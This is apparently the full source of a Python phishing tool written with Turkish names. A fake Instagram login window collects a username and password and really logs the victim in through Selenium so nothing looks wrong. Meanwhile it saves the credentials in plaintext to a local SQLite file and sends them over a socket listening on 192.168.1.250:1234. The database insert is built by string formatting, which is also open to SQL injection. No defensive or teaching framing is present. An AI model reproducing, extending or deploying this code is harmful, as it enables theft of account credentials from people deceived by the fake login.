from selenium import webdriver
from tkinter import *
import socket
import sqlite3
import threading
import sys
import time

class Socket():
    def bag(kullanıcı_adı,parola):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            host = "192.168.1.250"
            port = 1234

            s.bind((host,port))
            s.listen(1)

            baglan, adress = s.accept()
            baglan.send(bytes(kullanıcı_adı, "cp1254"))
            baglan.send(bytes(parola, "cp1254"))
        except:
            print("")

    def __init__(self):
        pass

class SeleniUM():
    def __init__(self):
        pass
    
    def giriss(isim2, parola2):
        browser = webdriver.Chrome()
        browser.get("http:\\www.instagram.com")
        giris_yap = browser.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div[2]/div[2]/p/a')
        giris_yap.click()

        user = browser.find_element_by_name("username")
        passw = browser.find_element_by_name("password")

        user.send_keys(isim2)
        passw.send_keys(parola2)

        giris = browser.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div[2]/div[1]/div/form/span/button')
        giris.click()


class sqlite():
    def __init__(self):
        pass
    
    def sql(isim2, parola2):
    
        db = sqlite3.connect("C:depo.db")
        im = db.cursor()
        im.execute("""CREATE TABLE IF NOT EXISTS kayıtlar(kullanıcılar, sifreler)""")
        isle = """INSERT INTO kayıtlar VALUES ("{}", "{}")""".format(isim2,parola2)
        im.execute(isle)
        db.commit()
        db.close()


pencere = Tk()
pencerem = pencere.title("instagram")
boyut = pencere.geometry("300x300+1000+90")

def sil():
    girdi1.delete(0,END)
    girdi2.delete(0,END)

def RUN():

    kullanıcı_adı = girdi1.get()
    parolam = girdi2.get()
    
    devam = threading.Thread(target=SeleniUM.giriss, args = (kullanıcı_adı,parolam))
    devam2 = threading.Thread(target=sqlite.sql, args = (kullanıcı_adı,parolam))
    devam3 = threading.Thread(target=Socket.bag, args = (kullanıcı_adı,parolam))

    pencere.quit()
    devam.start()
    devam2.start()
    devam3.start()
    sys.exit()

    

etiket1 = Label(text="Kullanıcı adı",fg="red",bg="gold",
                font="Times 15 italic")
etiket1.pack(expand=YES,side=TOP,fill=BOTH)
girdi1 = Entry()
girdi1.pack(expand=YES,side=TOP,fill=BOTH)

etiket2 = Label(text="şifre",fg="red",bg="gold",
                font="Times 15 italic")
etiket2.pack(expand=YES,side=TOP,fill=BOTH)
girdi2 = Entry()
girdi2.pack(expand=YES,side=TOP,fill=BOTH)

siler = Button(text="sil",fg="red",bg="gold",
               font="Times 15 italic",cursor="hand2",command=sil)
siler.pack(expand=YES,side=LEFT,fill=BOTH)

okey = Button(text="güveni giriş",fg="red",bg="gold",
              font="Times 15 italic", cursor="hand2",command=RUN)
okey.pack(expand=YES,side=RIGHT,fill=BOTH)


mainloop()
##ALONE
#CFX

    
